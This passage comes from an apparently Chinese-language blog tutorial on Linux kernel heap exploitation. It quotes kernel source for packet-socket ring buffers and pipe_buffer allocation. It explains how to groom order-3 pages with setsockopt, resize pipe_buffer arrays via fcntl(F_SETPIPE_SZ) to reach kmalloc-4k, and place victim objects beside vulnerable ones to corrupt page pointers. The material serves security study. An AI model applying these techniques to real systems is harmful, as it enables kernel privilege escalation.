class="line">release_sock(sk);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想要修改到<code>po-&gt;tp_version</code>需要进入到这个case，所以需要进行两次调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *rx_owner_map = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> was_running, order = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> *<span class="title">rb</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> *<span class="title">rb_queue</span>;</span></span><br><span class="line">__be16 num;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="comment">/* Added to avoid minimal code churn */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> *<span class="title">req</span> =</span> &amp;req_u-&gt;req;</span><br><span class="line"></span><br><span class="line">rb = tx_ring ? &amp;po-&gt;tx_ring : &amp;po-&gt;rx_ring;</span><br><span class="line">rb_queue = tx_ring ? &amp;sk-&gt;sk_write_queue : &amp;sk-&gt;sk_receive_queue;</span><br><span class="line"></span><br><span class="line">err = -EBUSY;</span><br><span class="line"><span class="keyword">if</span> (!closing) &#123;</span><br><span class="line"><span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (packet_read_pending(rb))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_frame_size;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">order = get_order(req-&gt;tp_block_size);</span><br><span class="line">pg_vec = alloc_pg_vec(req, order);</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">if</span> (closing || atomic_read(&amp;po-&gt;mapped) == <span class="number">0</span>) &#123;</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line">spin_lock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line">swap(rb-&gt;pg_vec, pg_vec);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;tp_version &lt;= TPACKET_V2)</span><br><span class="line">swap(rb-&gt;rx_owner_map, rx_owner_map);</span><br><span class="line">rb-&gt;frame_max = (req-&gt;tp_frame_nr - <span class="number">1</span>);</span><br><span class="line">rb-&gt;head = <span class="number">0</span>;</span><br><span class="line">rb-&gt;frame_size = req-&gt;tp_frame_size;</span><br><span class="line">spin_unlock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line"></span><br><span class="line">swap(rb-&gt;pg_vec_order, order);</span><br><span class="line">swap(rb-&gt;pg_vec_len, req-&gt;tp_block_nr);</span><br><span class="line"></span><br><span class="line">rb-&gt;pg_vec_pages = req-&gt;tp_block_size/PAGE_SIZE;</span><br><span class="line">po-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?</span><br><span class="line">tpacket_rcv : packet_rcv;</span><br><span class="line">skb_queue_purge(rb_queue);</span><br><span class="line"><span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line">pr_err(<span class="string">&quot;packet_mmap: vma is busy: %d\n&quot;</span>,</span><br><span class="line">       atomic_read(&amp;po-&gt;mapped));</span><br><span class="line">&#125;</span><br><span class="line">  ... ...</span><br><span class="line">out_free_pg_vec:</span><br><span class="line"><span class="keyword">if</span> (pg_vec) &#123;</span><br><span class="line">bitmap_free(rx_owner_map);</span><br><span class="line">free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里的order是由<code>req-&gt;tp_block_size</code>确定的，而且req是用户可以控制的，所以这里的申请的page的order也是可控的。并且需要注意的是在<code>if (closing || atomic_read(&amp;po-&gt;mapped) == 0)</code>这个条件分支中，会交换<code>rb-&gt;pg_vec</code>中的内容和当前函数中变量<code>pg_vec</code>中的内容，所以在最后不会执行到<code>free_pg_vec</code>函数。</p><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p>这里的释放流程很简单：<code>packet_release</code>=&gt;<code>packet_set_ring</code>=&gt;<code>free_pg_vec</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_pg_vec</span><span class="params">(struct pgv *pg_vec, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (likely(pg_vec[i].buffer)) &#123;</span><br><span class="line"><span class="keyword">if</span> (is_vmalloc_addr(pg_vec[i].buffer))</span><br><span class="line">vfree(pg_vec[i].buffer);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">free_pages((<span class="keyword">unsigned</span> <span class="keyword">long</span>)pg_vec[i].buffer,</span><br><span class="line">   order);</span><br><span class="line">pg_vec[i].buffer = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kfree(pg_vec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到就是将里面的内容给释放掉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_release</span><span class="params">(struct socket *sock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_fanout</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sk)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;rx_ring.pg_vec) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;req_u, <span class="number">0</span>, <span class="keyword">sizeof</span>(req_u));</span><br><span class="line">packet_set_ring(sk, &amp;req_u, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (po-&gt;tx_ring.pg_vec) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;req_u, <span class="number">0</span>, <span class="keyword">sizeof</span>(req_u));</span><br><span class="line">packet_set_ring(sk, &amp;req_u, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易注意到的是都调用的<code>packet_set_ring</code>函数，而在<code>packet_release</code>函数中所给的参数中第三个参数为1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br></pre></td></tr></table></figure><p>对比函数声明可以看出来这个参数就代表要关闭了，并且在执行这个函数之前<code>memset(&amp;req_u, 0, sizeof(req_u));</code>执行了这样一条语句，也就导致req中的所有内容都为<code>\x00</code>，也就不进入分配的分支中去了。不过依旧会进入到进行各种swap的分支，因为在分配时走过一次，所以这次最后会调用到<code>free_pg_vec</code>函数了，而这个函数在这里说了就是释放掉所有页面。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>当我们耗尽 buddy system 中的 low order pages 后，我们再请求的页面便都是物理连续的，因此此时我们再进行 <code>setsockopt()</code> 便相当于获取到了一块近乎物理连续的内存（为什么是”近乎连续“是因为大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面）。</p><p>所以这里的使用流程就是，先使用上述办法进行堆喷。</p><ol><li>  释放一部分order为3的page，接着使用victim object进行申请这些页面</li><li>  释放一个页面，使用vuln object申请这一页面</li><li>  释放一部分order为3的page，再次让victim object申请到</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/VvPk5nKYmDCWxOs.png"                      alt="再偷"                ></p><p>最终实现上图这样的效果。</p><h2 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h2><p>在以往的文章中出现了很多次的<code>pipe_buffer</code>，但是可惜的是使用的方式过于简单。比如，只是简单的利用他的ops指针进行泄漏或者覆盖它控制执行流，再就是<code>Dirty Pipe</code>中的利用。可恨的是我在做题的过程中并没有想到使用<code>Dirty Pipe</code>，即便是当时我已经对<code>pipe_buffer</code>所在的堆块上有绝对的权限了。所以这里就不再只是对其ops的利用了，后面主要就是破坏其<code>page</code>指针了。</p><h3 id="pipe-buffer分配过程"><a href="#pipe-buffer分配过程" class="headerlink" title="pipe_buffer分配过程"></a>pipe_buffer分配过程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_DEF_BUFFERS16</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line">pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">user_bufs = account_pipe_buffers(user, <span class="number">0</span>, pipe_bufs);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;</span><br><span class="line">user_bufs = account_pipe_buffers(user, pipe_bufs, PIPE_MIN_DEF_BUFFERS);</span><br><span class="line">pipe_bufs = PIPE_MIN_DEF_BUFFERS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">pipe-&gt;user = user;</span><br><span class="line">mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line"><span class="keyword">return</span> pipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="keyword">void</span>) account_pipe_buffers(user, pipe_bufs, <span class="number">0</span>);</span><br><span class="line">kfree(pipe);</span><br><span class="line">out_free_uid:</span><br><span class="line">free_uid(user);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在后面申请<code>pipe-&gt;bufs</code>使用了<code>kcalloc</code>函数，而这个函数的第一个参数分配的数量，第二参数就是每一个单位的大小。其实在其内部中也是会将这两个参数相乘起来的，而这两个值其实都是已知的，第一个为16，第二个为40，那么他们的结果就是640。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">kmalloc_slab</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">192</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">index = size_index[size_index_elem(size)];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">index = fls(size - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>kcalloc</code>函数中会到这里进行选择cache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123;</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">96</span>, <span class="number">96</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">192</span>, <span class="number">192</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8</span>, <span class="number">8</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32</span>, <span class="number">32</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">64</span>, <span class="number">64</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">128</span>, <span class="number">128</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">512</span>, <span class="number">512</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1024</span>, <span class="number">1</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2048</span>, <span class="number">2</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4096</span>, <span class="number">4</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8192</span>, <span class="number">8</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16384</span>, <span class="number">16</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32768</span>, <span class="number">32</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">65536</span>, <span class="number">64</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">131072</span>, <span class="number">128</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">262144</span>, <span class="number">256</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">524288</span>, <span class="number">512</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1048576</span>, <span class="number">1</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2097152</span>, <span class="number">2</span>M)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>很明显这里选择的是<code>kmalloc-cg-1k</code>。然而，<code>kmalloc-cg-1k</code>来自于<code>order</code>为2的页面。但是根据前面的意思我们需要<code>order</code>为3的页面出来的，所以如果这里申请的页面<code>order</code>为2的话成功率会大打折扣。</p><h3 id="pipe-buffer修改分配大小"><a href="#pipe-buffer修改分配大小" class="headerlink" title="pipe_buffer修改分配大小"></a>pipe_buffer修改分配大小</h3><p>pipe给人的惊喜是不断的，pipe可以提供了<code>fcntl(F_SETPIPE_SZ)</code>调用去修改每个pipe中<code>pipe_buffer</code>的数量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">pipe_set_size</span><span class="params">(struct pipe_inode_info *pipe, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_slots, size;</span><br><span class="line"><span class="keyword">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  </span><br><span class="line">  size = round_pipe_size(arg);</span><br><span class="line">nr_slots = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_slots)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">pipe-&gt;max_usage = nr_slots;</span><br><span class="line">pipe-&gt;nr_accounted = nr_slots;</span><br><span class="line"><span class="keyword">return</span> pipe-&gt;max_usage * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="keyword">void</span>) account_pipe_buffers(pipe-&gt;user, nr_slots, pipe-&gt;nr_accounted);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数中会调用到<code>pipe_resize_ring</code>函数，这里会根据size得到<code>nr_slots</code>，而在调用<code>pipe_resize_ring</code>函数时<code>nr_slots</code>为第二个参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe_resize_ring</span><span class="params">(struct pipe_inode_info *pipe, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_slots)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!bufs))</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line"></span><br><span class="line">n = pipe_occupancy(head, tail);</span><br><span class="line"><span class="keyword">if</span> (nr_slots &lt; n) &#123;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">kfree(bufs);</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到的是在这个函数开头的位置就调用了<code>kcalloc</code>函数，而这个函数的第一个参数就是我们可以通过<code>fcntl</code>调用修改的。如果，<code>nr_slots</code>的值为64，那么申请的size即为<code>0xa00</code>则会申请<code>kmalloc-4k</code>，此时<code>order</code>为3，可以大大提高成功率。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">calculate_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span 